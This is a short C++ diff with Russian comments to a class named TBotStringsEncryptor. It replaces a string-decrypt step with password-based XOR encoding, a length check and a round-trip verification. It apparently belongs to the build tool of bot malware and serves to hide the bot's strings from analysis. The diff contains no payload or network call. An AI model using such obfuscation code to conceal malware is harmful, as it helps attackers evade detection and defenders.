@@ -2010,20 +2010,24 @@ bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 			continue;
 		}
 
+		string OldString = Line;
+
 		DWORD Len = STRA::Length(Line);
+		if (Len > 255)
+			throw Exception("Размер кодируемой строки превышает допустимые нормы!");
 
 		// Шифруем данные
-		Decrypt(Line, Line);
+		// Шифруем XOR ключём. Нюанс в том, что мы сместим сроку на один байт
+		// и первым байтом запишем размер исходной строки
+		string Tmp = XORCrypt::EncodeString(Pass.c_str(), Line);
+
+		// Записываем шифрованную строку
+		m_memcpy(Line, Tmp.t_str(), Len + 1);
 
 		// Проверяем правильность шифрования
-		PCHAR Tmp = Line;
-		for (int i = 0; i < Len; i++)
-		{
-			if (*Tmp == 0)
-                throw Exception("Во время шифрования строк прооизошла ошибка");
-
-        	Tmp++;
-		}
+		string DecodedStr = XORCrypt::DecodeString(Pass.c_str(), Line);
+		if (OldString != DecodedStr)
+			throw Exception("Во время шифрования строк прооизошла ошибка");
 
 		// Переходим к следующей строке
 		Line += Len + 1;
